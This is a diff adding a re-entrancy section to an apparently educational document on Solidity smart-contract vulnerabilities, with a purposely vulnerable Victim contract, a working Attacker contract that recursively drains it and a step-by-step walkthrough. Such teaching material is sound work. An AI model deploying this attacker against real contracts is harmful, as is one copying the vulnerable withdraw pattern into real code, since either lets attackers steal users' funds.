@@ -147,3 +147,139 @@ contract SolutionTransactionOrdering {
 3. When contract owner updates the price, txCounter is incremented.
 
 4. Now if contract owner beats buyer in transaction ordering, the buyers transaction will be reverted since txCounter does not match thus signifying price has changed.
+
+
+## Re-entrancy Attack
+An attack where a malicious contract can call a withdraw(), to withdraw funds from a contract. As soon as the funds hit the attacking contract, it recalls withdraw(), this can be seen as a recursive loop attack, exploiting the order of commands in the Victim contract when it comes to updating the state of the contract.
+
+### Scenario - Pre Solution:
+
+Pre-Solution Contract is:
+```
+Attacker.sol
+
+Victim.sol
+```
+
+Participants:
+
+    * Malicious User
+
+    * Attacking Contract
+
+    * Victim Contract
+
+Contract:
+
+Victim:
+
+  * Victim Contract will act as a generic contract that maps users deposits to their address
+
+  * When the withdraw function is called, it will check if the msg.sender has a mapping and if it is above 0 (eligible to withdraw funds)
+
+  * It will then send the funds according to the balance mapped for the msg.sender
+
+  * It will update the state of the msg.sender balance to 0
+
+```
+pragma solidity ^0.4.18;
+
+contract Victim {
+  
+  mapping (address => uint) public balances;
+
+  event WithdrawEvent(address _sender, uint amount);
+
+  function Victim() {
+  }
+
+  function deposit() payable {
+    balances[msg.sender] = msg.value;
+  }
+
+  function getBalance() constant returns (uint) {
+    return balances[msg.sender];
+  }
+
+  function() payable {
+    // this.deposit();
+    balances[msg.sender] = msg.value;
+  }
+
+  function withdraw() {
+    WithdrawEvent(msg.sender, balances[msg.sender]);
+
+    require(balances[msg.sender] > 0);
+
+    if (!msg.sender.call.value(balances[msg.sender])()) {
+      revert();
+    } 
+
+    balances[msg.sender] = 0;
+  }
+
+}
+```
+
+Attacker: 
+
+* Attacker is init with the address of the deployed Victim Contract
+
+* We also import the Victim Contract or the ADB to call functions on it
+
+* When collect() is called, it will deposit 1 ether to the victim contract (to create a mapping balance for the attacker)
+
+* Attacker will call withdraw immediately, which will withdraw the 1 ether from the Victim
+
+* Ether will be paid to this contract, when that occurs, the fallback function will be executed, calling withdraw again upto 50 times (this is an arbitrary number), draining the Victim Contract of funds
+
+```
+pragma solidity ^0.4.18;
+
+import './Victim.sol';
+
+contract Attacker {
+
+  Victim public victim;
+  uint public count;
+
+  event LogFallback(uint _count, uint _balance);
+
+  function Attacker(address _victim) {
+    victim = Victim(_victim);
+  }
+
+  function collect() payable {
+    victim.deposit.value(msg.value)();
+    victim.withdraw();
+  }
+
+  function kill() {
+    selfdestruct(msg.sender);
+  }
+
+  function() payable {
+    LogFallback(count, this.balance);
+    count++;
+    if (count < 50) {
+      victim.withdraw();
+    }
+  }
+
+}
+```
+
+1. Attacker calls collect() and sends 1 ether to the Victim Contract
+
+2. Victim contract will map attackers address to value sent
+
+3. Attacker immedietely calls withdraw()
+
+4. Victim Contract checks that the attackers mapping has value greater than 0 (it does, since it sent 1 ether)
+
+5. Victim Contract sends 1 ether to the Attacking Contract
+
+6. When 1 ether is received at the Attacking Contract via the fallback function, victim.withdraw() is called again 50 times
+
+7. The Victim Contract will continue sending Ether to the Attacking contract until count has reached 50
+
